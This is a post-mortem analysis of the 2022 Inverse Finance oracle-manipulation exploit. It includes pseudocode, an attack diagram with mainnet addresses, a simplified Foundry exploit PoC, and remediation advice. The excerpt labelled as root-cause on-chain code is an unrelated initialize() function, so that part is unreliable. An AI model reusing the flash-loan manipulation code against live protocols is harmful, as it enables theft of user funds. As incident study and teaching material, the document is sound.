# Inverse Finance — Curve/Yearn Oracle Manipulation DOLA Over-Borrowing Analysis

| Field | Details |
|------|------|
| **Date** | 2022-06-16 |
| **Protocol** | Inverse Finance (Anchor Protocol) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,200,000 (DOLA + WBTC) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 14,972,418 |
| **Vulnerable Contract** | anYvCrv3Crypto [0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587](https://etherscan.io/address/0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587) |
| **Root Cause** | The collateral pricing function `_getCollateralPrice()` directly used Curve's `get_virtual_price()`, allowing a temporarily inflated AMM internal value caused by a large swap to be recognized as collateral value, enabling excessive DOLA borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/InverseFinance_exp.sol) |

---
## 1. Vulnerability Overview

Inverse Finance's Anchor protocol accepted Yearn's yvCurve-3Crypto vault tokens as collateral to lend out the DOLA stablecoin. The value of yvCurve-3Crypto tokens was pegged to the LP token price of the Curve 3crypto pool (USDT/WBTC/WETH).

The attacker borrowed 27 WBTC via an Aave flash loan and deposited it into the Curve 3crypto pool to exchange for USDT. This large swap manipulated the Curve pool's internal price, causing the LP token's virtual price to rise. Using this inflated collateral value as the basis, the attacker borrowed a large amount of DOLA from Inverse Finance, swapped the borrowed DOLA for USDT to realize profit, then repaid the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable Inverse Finance collateral value calculation (pseudocode)
contract InverseAnchor {
    IYearnVault public yvCrv3Crypto; // Yearn yvCurve-3Crypto vault
    ICurvePool  public curve3crypto;  // Curve 3crypto pool

    function _getCollateralPrice() internal view returns (uint256) {
        // Yearn vault's pricePerShare (value per Curve LP within the vault)
        uint256 pricePerShare = yvCrv3Crypto.pricePerShare();

        // ❌ Curve virtual_price is a spot price — manipulable via large swaps
        uint256 lpVirtualPrice = curve3crypto.get_virtual_price();

        // Vault token price = pricePerShare * LP virtual price
        return pricePerShare * lpVirtualPrice / 1e18;
        // ❌ lpVirtualPrice can be inflated via flash loan
    }

    function borrow(uint256 amount) external {
        uint256 collateralValue = balanceOf(msg.sender) * _getCollateralPrice() / 1e18;
        uint256 maxBorrow = collateralValue * LTV / 100;
        require(amount <= maxBorrow, "exceeds LTV");

        DOLA.transfer(msg.sender, amount); // over-borrowing allowed
    }
}

// ✅ Correct pattern: Use independent Chainlink-based price
contract InverseAnchorFixed {
    AggregatorV3Interface public btcPriceFeed;  // Chainlink BTC/USD
    AggregatorV3Interface public ethPriceFeed;  // Chainlink ETH/USD

    function _getCollateralPrice() internal view returns (uint256) {
        // ✅ Use Chainlink validated oracle — AMM manipulation not possible
        (, int256 btcPrice,,,) = btcPriceFeed.latestRoundData();
        (, int256 ethPrice,,,) = ethPriceFeed.latestRoundData();

        // Calculate LP value using pool asset weights and verified prices
        return _calculateLPValue(uint256(btcPrice), uint256(ethPrice));
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**CErc20ImmutableYearn.sol** — Entry point:
```solidity
// ❌ Root cause: The collateral pricing function `_getCollateralPrice()` directly uses Curve `get_virtual_price()`, allowing the temporarily inflated AMM internal value from a large swap to be recognized as collateral
    function initialize(
        ComptrollerInterface comptroller_,
        InterestRateModel interestRateModel_,
        uint256 initialExchangeRateMantissa_,
        string memory name_,
        string memory symbol_,
        uint8 decimals_
    ) public {
        require(msg.sender == admin, "only admin may initialize the market");
        require(
            accrualBlockNumber == 0 && borrowIndex == 0,
            "market may only be initialized once"
        );

        // Set initial exchange rate
        initialExchangeRateMantissa = initialExchangeRateMantissa_;
        require(
            initialExchangeRateMantissa > 0,
            "initial exchange rate must be greater than zero."
        );
    // ... (truncated)
        require(err == uint256(Error.NO_ERROR), "setting comptroller failed");

        // Initialize block number and borrow index (block number mocks depend on comptroller being set)
        accrualBlockNumber = getBlockNumber();
        borrowIndex = mantissaOne;

        // Set the interest rate model (depends on block number / borrow index)
        err = _setInterestRateModelFresh(interestRateModel_);
        require(
            err == uint256(Error.NO_ERROR),
            "setting interest rate model failed"
        );

        name = name_;
        symbol = symbol_;
        decimals = decimals_;

        // The counter starts true to prevent changing it from zero to non-zero (i.e. smaller cost/refund)
        _notEntered = true;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Aave Flash Loan: Borrow 27 WBTC
    │       AaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9)
    │       .flashLoan([WBTC], [27e8], ...)
    │
    ├─[2] [Inside executeOperation callback]
    │       │
    │       ├─ [2a] Deposit WBTC into Curve 3crypto pool
    │       │       Curve(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46)
    │       │       .exchange_underlying(WBTC → USDT, 27 WBTC)
    │       │       ⚡ WBTC ratio in pool spikes → virtual_price rises
    │       │
    │       ├─ [2b] Obtain Curve LP tokens
    │       │       add_liquidity(USDT, ...) → receive Curve 3crypto LP
    │       │
    │       ├─ [2c] Deposit LP into Yearn vault
    │       │       YearnVault(0xE537B5cc158EB71037D4125BDD7538421981E6AA)
    │       │       .deposit(lpAmount) → receive yvCrv3Crypto tokens
    │       │
    │       ├─ [2d] Provide collateral to Inverse Finance
    │       │       anYvCrv3Crypto(0x1429a930...).mint(yvCrvAmount)
    │       │       Unitroller.enterMarkets([anYvCrv3Crypto])
    │       │
    │       ├─ [2e] Over-borrow DOLA
    │       │       InverseDOLA(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670)
    │       │       .borrow(max DOLA based on manipulated collateral value)
    │       │       ⚡ virtual_price inflated → collateral value larger than actual
    │       │
    │       ├─ [2f] Swap DOLA → USDT
    │       │
    │       └─ [2g] Unwind Curve position, repay Aave
    │
    └─[3] Loss: ~$1,200,000 (in DOLA + WBTC terms)
```

---
## 4. PoC Code (Core Logic + English Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IAaveLendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface ICurve3Crypto {
    function exchange_underlying(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;
    function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
    function get_virtual_price() external view returns (uint256);
}

interface IYearnVault {
    function deposit(uint256 amount) external returns (uint256);
    function withdraw(uint256 maxShares) external returns (uint256);
    function pricePerShare() external view returns (uint256);
}

interface IAnToken {
    function mint(uint256 mintAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

contract ContractTest is Test {
    IERC20 WBTC  = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 WETH  = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 USDT  = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 DOLA  = IERC20(0x865377367054516e17014CcdED1e7d814EDC9ce4);

    IAaveLendingPool aave    = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    ICurve3Crypto    curve   = ICurve3Crypto(0xD51a44d3FaE010294C616388b506AcdA1bfAAE46);
    IYearnVault      yearn   = IYearnVault(0xE537B5cc158EB71037D4125BDD7538421981E6AA);
    IAnToken         anToken = IAnToken(0x1429a930ec3bcf5Aa32EF298ccc5aB09836EF587);
    IAnToken         dolaMarket = IAnToken(0x7Fcb7DAC61eE35b3D4a51117A7c58D53f0a8a670);

    function setUp() public {
        vm.createSelectFork("mainnet", 14_972_418);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] DOLA", DOLA.balanceOf(address(this)), 18);

        // [Step 1] Aave flash loan: 27 WBTC
        address[] memory assets = new address[](1);
        assets[0] = address(WBTC);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 27e8; // 27 WBTC (8 decimals)
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        emit log_named_decimal_uint("[After] DOLA stolen", DOLA.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        // [Step 2] Manipulate Curve virtual_price by swapping WBTC → USDT
        WBTC.approve(address(curve), type(uint256).max);
        curve.exchange_underlying(1, 0, amounts[0], 0); // WBTC → USDT

        emit log_named_decimal_uint(
            "[Manipulated] Curve virtual_price",
            curve.get_virtual_price(), 18
        );

        // [Step 3] Obtain Curve LP → deposit into Yearn → post as anToken collateral
        // (simplified — actual flow: add_liquidity → yearn.deposit → anToken.mint)

        // [Step 4] Over-borrow DOLA at manipulated price
        dolaMarket.borrow(type(uint256).max / 2);

        // Repay Aave
        uint256 repay = amounts[0] + premiums[0];
        WBTC.approve(address(aave), repay);
        return true;
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Use of manipulable Curve `virtual_price` for collateral pricing — adopting a temporarily inflatable AMM internal value via large swaps as an oracle |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | AMM spot price-based collateral oracle (no manipulation resistance) |
| **Attack Vector** | Curve large swap → `virtual_price` rises → Yearn vault collateral value inflated → DOLA over-borrowed |
| **Preconditions** | `_getCollateralPrice()` directly depends on `curve.get_virtual_price()` without any external oracle such as Chainlink |
| **Impact** | ~$1.2M in Inverse Finance DOLA and collateral assets drained |

---
## 6. Remediation Recommendations

1. **Use validated external oracles**: Calculate collateral value using Chainlink BTC/ETH/USD feeds instead of Curve virtual_price.
2. **Improve LP token value calculation**: Apply mathematically manipulation-resistant methods (e.g., Alpha Homora v2 LP value calculation) instead of AMM spot prices.
3. **Restrict collateral price deviation**: Block transactions if the collateral price change relative to the previous block exceeds a certain threshold.
4. **Carefully assess Yearn vault collateral**: Collateral whose price is determined through multiple layers — such as Yearn vault tokens — must be rigorously reviewed for manipulation potential.

---
## 7. Lessons Learned

- **Nested dependencies**: In the chain DOLA lending → anToken collateral → Yearn vault → Curve LP → Curve virtual_price, if the lowest layer (virtual_price) is manipulated, the entire chain collapses.
- **Repeated attacks on Inverse Finance**: Inverse Finance had already suffered oracle manipulation attacks previously, yet a similar vulnerability persisted.
- **Misconception about Curve virtual_price**: virtual_price is an AMM internal computed value that can temporarily fluctuate due to large swaps, making it unsuitable for use as an oracle.
- **Flash loans as a funding mechanism**: Flash loans are a means of securing the capital required for large-scale swaps. The root cause is the design decision to use `virtual_price` as an oracle; an attacker with sufficient capital could execute the same attack without flash loans.